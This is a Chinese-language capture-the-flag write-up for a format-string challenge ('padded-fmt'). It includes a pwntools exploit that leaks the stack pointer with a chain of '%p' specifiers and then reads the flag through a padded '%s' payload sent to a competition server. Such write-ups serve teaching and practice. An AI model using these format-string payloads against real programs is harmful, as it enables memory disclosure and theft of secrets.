# padded-fmt 

*李华在学习了格式化字符串漏洞后大受震撼，但他突然想到“对啊，如果我给`%n$p`里的`$`过滤掉，
再配合上一个很大块的空数据让printf随便泄露，不就是个安全的printf了吗！”*

*于是李华写了下面的这个 demo，看看聪明的你能不能打他的脸*

## 文件属性

|属性  |值    |
|------|------|
|Arch  |x64   |
|RELRO|Partial|
|Canary|off   |
|NX    |on    |
|PIE   |on    |
|strip |no    |

## 解题思路

程序将flag读到了ctx（栈）上，虽然栈上没有触手可及的的栈地址，但是寄存器里有，
我们就可以推算出ctx的地址，接下来以这个地址用字符串的方式打印就可以获得flag

## EXPLOIT

```python
from pwn import *
context.terminal = ['tmux','splitw','-h']
GOLD_TEXT = lambda x: f'\x1b[33m{x}\x1b[0m'
EXE = './fmt'

def payload(lo:int):
    global sh
    if lo:
        sh = process(EXE)
        if lo & 2:
            gdb.attach(sh)
    else:
        sh = remote('competition.blue-whale.me', 20603)
    elf = ELF(EXE)

    sh.sendlineafter(b'name?\n', b'%p,%p,%p,%p,%p,%p,%p')
    rsp = int(sh.recvuntil(b'have', True).decode().split(',')[6], 16)
    success(GOLD_TEXT(f'Leak rsp: {hex(rsp)}'))
    flagAddr = rsp + 0x470
    
    sh.sendlineafter(b'say?\n', (b'%p,'*16 + b'%s').ljust(0x38, b'\0') + p64(flagAddr))
    flag = sh.recvuntil(b'}').decode().split(',')[-1]
    success(f'FLAG is: {flag}')
    sh.close()
```
